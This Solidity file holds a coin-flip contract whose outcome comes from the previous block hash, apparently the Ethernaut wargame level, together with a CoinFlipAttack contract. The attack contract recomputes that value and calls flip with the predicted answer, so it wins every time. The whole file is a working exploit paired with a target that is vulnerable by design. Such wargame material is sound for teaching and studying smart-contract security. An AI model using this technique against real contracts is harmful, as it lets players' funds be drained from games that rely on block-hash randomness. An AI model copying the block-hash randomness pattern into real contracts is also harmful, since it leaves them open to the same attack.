// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public coinFlip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address adr) {
        coinFlip = ICoinFlip(adr);
    }

    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            return false;
        }
        lastHash = blockValue;
        uint256 coinFlipUint = blockValue / FACTOR;
        bool side = coinFlipUint == 1 ? true : false;
        coinFlip.flip(side);
        return true;
    }
}
